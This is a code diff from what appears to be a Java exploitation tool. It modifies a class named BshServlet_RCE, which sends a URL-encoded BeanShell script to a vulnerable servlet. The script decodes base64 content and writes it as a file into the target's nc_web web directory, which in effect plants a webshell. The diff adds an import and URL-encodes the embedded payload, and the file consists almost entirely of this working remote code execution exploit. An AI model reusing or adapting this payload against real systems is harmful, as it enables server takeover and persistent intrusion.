@@ -4,6 +4,7 @@ import com.chave.bean.Config;
 import com.chave.proxy.HttpProxy;
 import com.chave.utils.HttpUtil;
 import com.chave.utils.SSLUtil;
+import com.chave.utils.Util;
 import javafx.scene.control.TextArea;
 import java.net.HttpURLConnection;
 import java.net.URL;
@@ -219,7 +220,7 @@ public class BshServlet_RCE extends VulnBase {
 
             String fileName = Config.FILENAME;
             byte[] fileText = Base64.getEncoder().encode(Config.FILETEXT.getBytes(StandardCharsets.UTF_8));
-            String postData = "bsh.script=import+sun.misc.BASE64Decoder%3B%0D%0A%0D%0ABASE64Decoder+decoder+%3D+new+BASE64Decoder%28%29%3B%0D%0AFileWriter+fw+%3D+new+FileWriter%28new+File%28%22.%2Fwebapps%2Fnc_web%2F" + fileName + "%22%29%29%3B%0D%0AString+data+%3D+%22" + new String(fileText) + "%22%3B%0D%0AString+str+%3D+new+String%28decoder.decodeBuffer%28data%29%2C+%22utf-8%22%29%3B%0D%0Afw.write%28str%29%3B%0D%0Afw.close%28%29%3B";
+            String postData = "bsh.script=" + "import+sun.misc.BASE64Decoder%3B%0D%0A%0D%0ABASE64Decoder+decoder+%3D+new+BASE64Decoder%28%29%3B%0D%0AFileWriter+fw+%3D+new+FileWriter%28new+File%28%22.%2Fwebapps%2Fnc_web%2F" + fileName + "%22%29%29%3B%0D%0AString+data+%3D+%22" + URLEncoder.encode(new String(fileText, "UTF-8")) + "%22%3B%0D%0AString+str+%3D+new+String%28decoder.decodeBuffer%28data%29%2C+%22utf-8%22%29%3B%0D%0Afw.write%28str%29%3B%0D%0Afw.close%28%29%3B";
 
             // post 请求
             HttpUtil.post(conn, postData.getBytes(StandardCharsets.UTF_8));
